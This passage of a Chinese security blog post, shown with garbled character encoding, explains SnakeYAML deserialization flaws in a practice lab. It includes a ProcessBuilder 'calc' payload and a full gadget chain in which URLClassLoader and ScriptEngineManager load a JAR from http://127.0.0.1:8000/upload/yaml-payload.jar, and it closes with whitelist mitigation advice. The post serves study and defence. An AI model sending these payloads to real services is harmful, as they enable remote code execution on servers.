<li><p><strong>ç»„è£…å¯¹è±¡å¹¶è¿”å›</strong><br>è‹¥ YAML ä¸­åŒ…å«åµŒå¥—ç»“æ„ï¼ˆå¦‚å¯¹è±¡ä¸­åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œ<code>Constructor</code>ä¼šé€’å½’æ‰§è¡Œä¸Šè¿°æ­¥éª¤ï¼Œæœ€ç»ˆç»„è£…å‡ºå®Œæ•´çš„å¯¹è±¡æ ‘å¹¶è¿”å›ã€‚</p>
</li>
</ol>
<h3 id="äºŒã€å®‰å…¨é£é™©ï¼šé»˜è®¤é…ç½®ä¸‹çš„ååºåˆ—åŒ–æ¼æ´æˆå› "><a href="#äºŒã€å®‰å…¨é£é™©ï¼šé»˜è®¤é…ç½®ä¸‹çš„ååºåˆ—åŒ–æ¼æ´æˆå› " class="headerlink" title="äºŒã€å®‰å…¨é£é™©ï¼šé»˜è®¤é…ç½®ä¸‹çš„ååºåˆ—åŒ–æ¼æ´æˆå› "></a>äºŒã€å®‰å…¨é£é™©ï¼šé»˜è®¤é…ç½®ä¸‹çš„ååºåˆ—åŒ–æ¼æ´æˆå› </h3><p>SnakeYAML çš„é£é™©æ ¸å¿ƒåœ¨äº<strong>é»˜è®¤ Constructor å…è®¸å®ä¾‹åŒ–ä»»æ„ Java ç±»</strong>ï¼Œä¸”åœ¨å¯¹è±¡å®ä¾‹åŒ– &#x2F; å±æ€§èµ‹å€¼è¿‡ç¨‹ä¸­å¯èƒ½è§¦å‘å±é™©æ–¹æ³•ï¼Œå¯¼è‡´æ”»å‡»è€…å¯æ„é€ æ¶æ„ YAML æ‰§è¡Œä»£ç ã€‚å…·ä½“åŸå› å¦‚ä¸‹ï¼š</p>
<ol>
<li><p><strong>æ— é™åˆ¶çš„ç±»å®ä¾‹åŒ–</strong><br>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>Yaml</code>å¯¹è±¡ä½¿ç”¨<code>DefaultConstructor</code>ï¼Œè¯¥æ„é€ å™¨ä¸é™åˆ¶å¯å®ä¾‹åŒ–çš„ç±» â€”â€” åªè¦ YAML ä¸­æŒ‡å®šäº†å…¨ç±»åï¼ˆå¦‚<code>!!java.lang.Runtime</code>ï¼‰ï¼ŒSnakeYAML å°±ä¼šå°è¯•é€šè¿‡åå°„åˆ›å»ºè¯¥ç±»çš„å®ä¾‹ã€‚</p>
<p>è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨ YAML ä¸­æŒ‡å®š<strong>å…·æœ‰å±é™©è¡Œä¸ºçš„ç±»</strong>ï¼ˆå¦‚<code>java.lang.ProcessBuilder</code>ã€<code>java.lang.Runtime</code>ç­‰å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç±»ï¼‰ã€‚</p>
</li>
<li><p><strong>æ–¹æ³•è°ƒç”¨ä¸å±æ€§èµ‹å€¼çš„å‰¯ä½œç”¨</strong><br>éƒ¨åˆ†ç±»åœ¨<strong>å®ä¾‹åŒ–</strong>æˆ–<strong>å±æ€§è®¾ç½®</strong>è¿‡ç¨‹ä¸­ä¼šè§¦å‘å±é™©æ“ä½œï¼š</p>
<ul>
<li>ä¾‹å¦‚ï¼Œ<code>ProcessBuilder</code>çš„<code>start()</code>æ–¹æ³•å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè‹¥æ”»å‡»è€…åœ¨ YAML ä¸­æ„é€ <code>ProcessBuilder</code>å¹¶è§¦å‘å…¶<code>start()</code>è°ƒç”¨ï¼Œå³å¯åœ¨æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ï¼›</li>
<li>æŸäº›ç±»çš„ setter æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æœ¬èº«åŒ…å«å±é™©é€»è¾‘ï¼ˆå¦‚æ–‡ä»¶æ“ä½œã€ç½‘ç»œè¿æ¥ï¼‰ï¼Œååºåˆ—åŒ–æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</li>
</ul>
</li>
<li><p><strong>æ¶æ„ YAML payload ç¤ºä¾‹</strong><br>ä¸€ä¸ªå…¸å‹çš„æ¶æ„ YAML payload å¦‚ä¸‹ï¼Œç”¨äºæ‰§è¡Œ<code>calc</code>å‘½ä»¤ï¼ˆæ‰“å¼€è®¡ç®—å™¨ï¼‰ï¼š</p>
<blockquote>
<p>!!java.lang.ProcessBuilder [[â€œcalcâ€]]</p>
</blockquote>
<p>è§£æè¿‡ç¨‹ï¼š</p>
<ul>
<li><code>!!java.lang.ProcessBuilder</code>æŒ‡å®šå®ä¾‹åŒ–<code>ProcessBuilder</code>ç±»ï¼›</li>
<li><code>[[&quot;calc&quot;]]</code>è¡¨ç¤ºè°ƒç”¨<code>ProcessBuilder</code>çš„æœ‰å‚æ„é€ æ–¹æ³•ï¼ˆå‚æ•°ä¸ºå­—ç¬¦ä¸²æ•°ç»„<code>[&quot;calc&quot;]</code>ï¼‰ï¼›</li>
<li>è™½ç„¶æœªæ˜¾å¼è°ƒç”¨<code>start()</code>ï¼Œä½†éƒ¨åˆ†ç‰ˆæœ¬çš„ SnakeYAML åœ¨è§£ææ—¶ä¼šéšå¼è§¦å‘æˆ–é€šè¿‡å…¶ä»–æ–¹å¼é—´æ¥è°ƒç”¨ï¼ˆå®é™…æ”»å‡»ä¸­å¯èƒ½éœ€è¦æ›´å¤æ‚çš„é“¾å¼è°ƒç”¨ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 id="ä¸‰ã€æ€»ç»“"><a href="#ä¸‰ã€æ€»ç»“" class="headerlink" title="ä¸‰ã€æ€»ç»“"></a>ä¸‰ã€æ€»ç»“</h3><p>SnakeYAML ååºåˆ—åŒ–çš„æ ¸å¿ƒåŸç†æ˜¯ â€œåŸºäº YAML æ ‡ç­¾å’Œæ•°æ®ï¼Œé€šè¿‡åå°„åŠ¨æ€åˆ›å»ºå¹¶ç»„è£… Java å¯¹è±¡â€ã€‚å…¶å®‰å…¨é£é™©æºäº<strong>é»˜è®¤é…ç½®ä¸‹å¯¹å¯å®ä¾‹åŒ–ç±»æ— é™åˆ¶</strong>ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„ YAMLï¼Œè®© SnakeYAML å®ä¾‹åŒ–å±é™©ç±»å¹¶è§¦å‘å…¶æ–¹æ³•ï¼Œæœ€ç»ˆæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<p>å®‰å…¨ä½¿ç”¨æ–¹å¼ï¼šé€šè¿‡è‡ªå®šä¹‰<code>Constructor</code>é™åˆ¶å¯ååºåˆ—åŒ–çš„ç±»ï¼ˆç™½åå•æœºåˆ¶ï¼‰ï¼Œç¦æ­¢å®ä¾‹åŒ–<code>ProcessBuilder</code>ã€<code>Runtime</code>ç­‰å±é™©ç±»ã€‚</p>
</blockquote>
<p><img src="/./images/image-20250818214718656.png" alt="image-20250818214718656"></p>
<p>å¯¹äºé¶åœºä¸­å½“æäº¤payloadå</p>
<h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h4><blockquote>
<h3 id="ä¸€ã€åç«¯ä»£ç çš„å¤„ç†é€»è¾‘"><a href="#ä¸€ã€åç«¯ä»£ç çš„å¤„ç†é€»è¾‘" class="headerlink" title="ä¸€ã€åç«¯ä»£ç çš„å¤„ç†é€»è¾‘"></a>ä¸€ã€åç«¯ä»£ç çš„å¤„ç†é€»è¾‘</h3><p>åç«¯ä»£ç æ˜¯ä¸€ä¸ª Spring æ§åˆ¶å™¨ï¼Œæ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ¥æ”¶å‰ç«¯ä¼ å…¥çš„<code>content</code>å‚æ•°ï¼ˆå³ç”¨æˆ·å¯æ§çš„ YAML å­—ç¬¦ä¸²ï¼‰ï¼›</li>
<li>ä½¿ç”¨ SnakeYAML çš„<code>Yaml</code>ç±»ï¼ˆé»˜è®¤é…ç½®ï¼‰è°ƒç”¨<code>load(content)</code>æ–¹æ³•ï¼Œå¯¹ YAML å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼›</li>
<li>ååºåˆ—åŒ–è¿‡ç¨‹ä¼šæ ¹æ® YAML ä¸­çš„å®šä¹‰å®ä¾‹åŒ– Java å¯¹è±¡ï¼Œå¹¶è¿”å›ç»“æœã€‚</li>
</ol>
<p><strong>å…³é”®é£é™©ç‚¹</strong>ï¼šä»£ç ä½¿ç”¨äº†<code>new Yaml()</code>çš„é»˜è®¤æ„é€ ï¼Œæ­¤æ—¶ SnakeYAML ä¼šä½¿ç”¨<code>DefaultConstructor</code>â€”â€” è¯¥æ„é€ å™¨<strong>ä¸é™åˆ¶å¯å®ä¾‹åŒ–çš„ç±»</strong>ï¼Œå…è®¸æ”»å‡»è€…æŒ‡å®šä»»æ„ Java ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<h3 id="äºŒã€Payload-çš„ç»“æ„ä¸æ‰§è¡Œæµç¨‹"><a href="#äºŒã€Payload-çš„ç»“æ„ä¸æ‰§è¡Œæµç¨‹" class="headerlink" title="äºŒã€Payload çš„ç»“æ„ä¸æ‰§è¡Œæµç¨‹"></a>äºŒã€Payload çš„ç»“æ„ä¸æ‰§è¡Œæµç¨‹</h3><p>ä¼ å…¥çš„ YAML payload ä¸ºï¼š</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&#x27;http://127.0.0.1:8000/upload/yaml-payload.jar&#x27;</span>]]]]</span><br></pre></td></tr></table></figure>

<p>å…¶æœ¬è´¨æ˜¯é€šè¿‡ SnakeYAML çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œä¾æ¬¡å®ä¾‹åŒ–ä¸‰ä¸ªå…³é”®ç±»ï¼Œå½¢æˆæ”»å‡»é“¾ï¼š<code>URL</code> â†’ <code>URLClassLoader</code> â†’ <code>ScriptEngineManager</code>ï¼Œæœ€ç»ˆè§¦å‘æ¶æ„ä»£ç æ‰§è¡Œã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<h4 id="1-å®ä¾‹åŒ–java-net-URLå¯¹è±¡"><a href="#1-å®ä¾‹åŒ–java-net-URLå¯¹è±¡" class="headerlink" title="1. å®ä¾‹åŒ–java.net.URLå¯¹è±¡"></a>1. å®ä¾‹åŒ–<code>java.net.URL</code>å¯¹è±¡</h4><ul>
<li>YAML ä¸­<code>!!java.net.URL [&#39;http://127.0.0.1:8000/upload/yaml-payload.jar&#39;]</code>è¡¨ç¤ºï¼š<br>ååºåˆ—åŒ–ä¸€ä¸ª<code>URL</code>å¯¹è±¡ï¼ŒæŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„ JAR åŒ…åœ°å€ï¼ˆ<code>http://127.0.0.1:8000/upload/yaml-payload.jar</code>ï¼‰ã€‚</li>
</ul>
<h4 id="2-å®ä¾‹åŒ–java-net-URLClassLoaderå¯¹è±¡"><a href="#2-å®ä¾‹åŒ–java-net-URLClassLoaderå¯¹è±¡" class="headerlink" title="2. å®ä¾‹åŒ–java.net.URLClassLoaderå¯¹è±¡"></a>2. å®ä¾‹åŒ–<code>java.net.URLClassLoader</code>å¯¹è±¡</h4><ul>
<li><p>YAML ä¸­<code>!!java.net.URLClassLoader [[...]]</code>è¡¨ç¤ºï¼š<br>ååºåˆ—åŒ–ä¸€ä¸ª<code>URLClassLoader</code>ï¼ˆç±»åŠ è½½å™¨ï¼‰ï¼Œå…¶æ„é€ å‚æ•°æ˜¯ä¸Šä¸€æ­¥åˆ›å»ºçš„<code>URL</code>æ•°ç»„ï¼ˆå³æ¶æ„ JAR çš„åœ°å€ï¼‰ã€‚</p>
<p><code>URLClassLoader</code>çš„ä½œç”¨æ˜¯<strong>ä»æŒ‡å®šçš„ URLï¼ˆè¿œç¨‹æˆ–æœ¬åœ°ï¼‰åŠ è½½ç±»æ–‡ä»¶</strong>ã€‚è¿™é‡Œé…ç½®åï¼Œè¯¥ç±»åŠ è½½å™¨ä¼šä»<code>yaml-payload.jar</code>ä¸­åŠ è½½ç±»ã€‚</p>
</li>
</ul>
<h4 id="3-å®ä¾‹åŒ–javax-script-ScriptEngineManagerå¯¹è±¡"><a href="#3-å®ä¾‹åŒ–javax-script-ScriptEngineManagerå¯¹è±¡" class="headerlink" title="3. å®ä¾‹åŒ–javax.script.ScriptEngineManagerå¯¹è±¡"></a>3. å®ä¾‹åŒ–<code>javax.script.ScriptEngineManager</code>å¯¹è±¡</h4><ul>
<li><p>YAML ä¸­<code>!!javax.script.ScriptEngineManager [...]</code>è¡¨ç¤ºï¼š<br>ååºåˆ—åŒ–ä¸€ä¸ª<code>ScriptEngineManager</code>ï¼ˆè„šæœ¬å¼•æ“ç®¡ç†å™¨ï¼‰ï¼Œå…¶æ„é€ å‚æ•°æ˜¯ä¸Šä¸€æ­¥åˆ›å»ºçš„<code>URLClassLoader</code>ã€‚</p>
<p><code>ScriptEngineManager</code>çš„æ ¸å¿ƒç‰¹æ€§æ˜¯ï¼š<strong>åœ¨åˆå§‹åŒ–æ—¶ä¼šè‡ªåŠ¨æ‰«æå¹¶åŠ è½½å¯ç”¨çš„è„šæœ¬å¼•æ“</strong>ï¼ˆé€šè¿‡<code>ServiceLoader</code>æœºåˆ¶ï¼‰ã€‚å…·ä½“æ¥è¯´ï¼š</p>
<ul>
<li>å®ƒä¼šä½¿ç”¨ä¼ å…¥çš„<code>URLClassLoader</code>å»åŠ è½½<code>yaml-payload.jar</code>ä¸­çš„ç±»ï¼›</li>
<li>è‹¥è¯¥ JAR åŒ…ä¸­åŒ…å«ç¬¦åˆ â€œè„šæœ¬å¼•æ“è§„èŒƒâ€ çš„æ¶æ„ç±»ï¼ˆä¾‹å¦‚ï¼Œåœ¨<code>META-INF/services/javax.script.ScriptEngineFactory</code>æ–‡ä»¶ä¸­å£°æ˜çš„ç±»ï¼‰ï¼Œ<code>ScriptEngineManager</code>ä¼šé€šè¿‡<code>URLClassLoader</code>åŠ è½½å¹¶å®ä¾‹åŒ–è¿™äº›æ¶æ„ç±»ï¼›</li>
<li>æ¶æ„ç±»çš„æ„é€ æ–¹æ³•æˆ–åˆå§‹åŒ–é€»è¾‘ä¸­å¯ä»¥åŒ…å«ä»»æ„ä»£ç ï¼ˆå¦‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€åå¼¹ shell ç­‰ï¼‰ï¼Œæ­¤æ—¶ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œã€‚</li>
</ul>
</li>
</ul>
</blockquote>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>è¯·æˆ‘ä¸€æ¯å’–å•¡å§ï¼</div>
  <button>
    èµèµ
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="å­éé±¼ å¾®ä¿¡">
        <span>å¾®ä¿¡</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="å­éé±¼ æ”¯ä»˜å®">
        <span>æ”¯ä»˜å®</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Java/" rel="tag"># Java</a>
              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># å®‰å…¨</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/09/21/Java%E6%94%BB%E9%98%B2/%E4%B8%93%E9%A2%98%E6%BC%8F%E6%B4%9E/" rel="prev" title="ä¸“é¢˜æ¼æ´">
                  <i class="fa fa-angle-left"></i> ä¸“é¢˜æ¼æ´
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/09/21/Java%E6%94%BB%E9%98%B2/JNDI%E6%B3%A8%E5%85%A5/" rel="next" title="JNDIæ³¨å…¥">
                  JNDIæ³¨å…¥ <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">å­éé±¼</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="è¿”å›é¡¶éƒ¨">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
